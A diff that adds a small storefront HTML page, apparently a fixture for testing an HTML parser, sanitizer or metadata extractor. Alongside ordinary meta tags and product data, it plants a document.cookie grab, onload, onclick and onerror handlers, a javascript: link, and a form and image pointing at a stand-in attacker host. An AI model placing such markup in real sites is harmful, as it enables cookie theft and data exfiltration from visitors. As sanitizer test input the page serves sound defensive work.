@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+<head>
+    <title>Acme &lt;Store&gt;</title>
+    <meta name="description" content="Tools for independent makers">
+    <meta name="generator" content="WordPress 7.0">
+    <link rel="canonical" href="https://shop.example/products/widget#details">
+    <script type="application/ld+json">
+        {"@type":"Product","name":"Safe Widget","offers":{"price":"29.99","priceCurrency":"USD"}}
+    </script>
+    <script>window.steal = document.cookie</script>
+</head>
+<body onload="steal()">
+    <h1>Build better widgets</h1>
+    <h2>For small teams</h2>
+    <p>Safe Widget is available for $29.99 USD.</p>
+    <a href="/catalog#top">Learn more</a>
+    <a href="mailto:hello@shop.example">Contact sales</a>
+    <a href="javascript:alert(1)">Unsafe link</a>
+    <button onclick="steal()">Buy now</button>
+    <form action="https://attacker.example"><input name="secret"></form>
+    <img src="https://attacker.example/tracker.gif" onerror="steal()">
+    <div class="wp-content">Technology marker</div>
+</body>
+</html>
